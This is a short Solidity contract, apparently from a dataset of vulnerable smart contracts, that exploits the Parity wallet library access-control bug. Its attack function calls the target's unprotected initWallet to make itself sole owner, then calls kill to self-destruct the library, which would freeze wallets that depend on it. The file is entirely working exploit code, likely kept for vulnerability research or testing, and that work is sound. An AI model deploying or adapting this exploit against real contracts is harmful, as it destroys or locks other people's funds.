pragma solidity ^0.4.9;


import "../dataset/access_control/parity_wallet_bug_2.sol";

contract WalletLibraryAttacker {

    WalletLibrary target;

    function WalletLibraryAttacker(address _target) {
        target = WalletLibrary(_target);
    }

    function attack() {
        address[] memory _owners = new address[](1);
        _owners[0] = address(this);
        target.initWallet(_owners, 1, 0);
        target.kill(address(this));
    }
}